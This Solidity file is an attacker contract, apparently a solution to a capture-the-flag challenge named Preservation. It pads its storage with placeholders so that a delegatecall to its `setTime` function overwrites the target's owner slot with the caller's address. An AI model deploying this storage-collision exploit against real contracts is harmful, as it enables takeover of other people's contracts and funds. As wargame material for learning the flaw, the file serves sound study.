// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "hardhat/console.sol";

contract PreservationHack {

  // 2 dummy variable with owner in the 3rd storage slot to match the target contract

  address public placeholder;
  address public placeholder1;
  address public owner;

  // parameter in setTime is just a placeholder here, not needed
  function setTime(uint _time) public {
    // this is fine because of delegate call, where msg.sender is in context of Preservation contract
    owner = msg.sender;
  }
}
